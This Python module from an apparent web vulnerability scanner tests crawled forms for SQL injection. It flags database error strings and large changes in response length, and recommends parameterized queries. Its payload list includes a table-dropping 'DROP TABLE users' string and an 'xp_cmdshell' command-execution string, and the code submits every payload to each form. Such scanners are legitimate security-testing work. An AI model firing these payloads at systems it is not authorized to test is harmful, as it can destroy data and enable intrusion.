"""
sql_injection.py — SQL Injection Detection Module
Tests discovered forms and URL parameters for possible SQL injection vulnerabilities.
"""

import requests
import copy

# Common SQL injection payloads
SQL_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin' --",
    "' OR 'x'='x",
    "1; DROP TABLE users --",
    "' UNION SELECT NULL --",
    "'; EXEC xp_cmdshell('dir') --",
    "' OR SLEEP(5) --",
]

# Database error signatures that suggest SQL injection
DB_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlsyntaxerrorexception",
    "org.hibernate",
    "com.mysql.jdbc",
    "pg::syntaxerror",
    "sqlite3::exception",
    "odbc sql server driver",
    "microsoft ole db provider",
    "jet database engine",
    "ora-01756",
    "syntax error or access violation",
    "division by zero",
    "supplied argument is not a valid mysql",
    "mysqli_fetch_array()",
    "invalid query",
    "sql error",
    "db error",
]


def _get_baseline_response(url: str, method: str, data: dict, timeout: int = 10):
    """Get a baseline response with neutral data."""
    try:
        if method == "post":
            r = requests.post(url, data=data, timeout=timeout, allow_redirects=True)
        else:
            r = requests.get(url, params=data, timeout=timeout, allow_redirects=True)
        return r
    except Exception:
        return None


def _has_db_error(response_text: str) -> bool:
    """Check if the response contains database error signatures."""
    text_lower = response_text.lower()
    return any(sig in text_lower for sig in DB_ERROR_SIGNATURES)


def test_sql_injection(forms: list, timeout: int = 10) -> list:
    """
    Test forms for SQL injection vulnerabilities.

    Args:
        forms: List of form dicts from the crawler.
        timeout: HTTP request timeout.

    Returns:
        List of vulnerability finding dicts.
    """
    findings = []
    tested = set()

    for form in forms:
        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]
        page_url = form["page_url"]

        if action in tested:
            continue
        tested.add(action)

        # Build neutral baseline data
        baseline_data = {}
        for inp in inputs:
            inp_type = inp.get("type", "text")
            if inp_type in ("submit", "button", "image", "reset", "file"):
                continue
            baseline_data[inp["name"]] = "test"

        baseline_resp = _get_baseline_response(action, method, baseline_data, timeout)
        baseline_len = len(baseline_resp.text) if baseline_resp else 0

        for payload in SQL_PAYLOADS:
            injected_data = copy.copy(baseline_data)
            if not injected_data:
                continue

            # Inject into each text-like field
            for field_name in list(injected_data.keys()):
                injected_data[field_name] = payload

            try:
                if method == "post":
                    resp = requests.post(action, data=injected_data, timeout=timeout, allow_redirects=True)
                else:
                    resp = requests.get(action, params=injected_data, timeout=timeout, allow_redirects=True)
            except Exception:
                continue

            vulnerable = False
            reason = ""

            if _has_db_error(resp.text):
                vulnerable = True
                reason = "Database error string detected in response"
            elif baseline_resp and abs(len(resp.text) - baseline_len) > 500:
                vulnerable = True
                reason = f"Significant response length difference ({baseline_len} → {len(resp.text)} bytes)"

            if vulnerable:
                findings.append({
                    "type": "SQL Injection",
                    "url": action,
                    "source_page": page_url,
                    "payload": payload,
                    "reason": reason,
                    "risk": "High",
                    "recommendation": (
                        "Use parameterized queries / prepared statements. "
                        "Never interpolate user input directly into SQL strings. "
                        "Apply input validation and restrict DB error visibility."
                    ),
                })
                break  # One finding per form endpoint is enough

    return findings
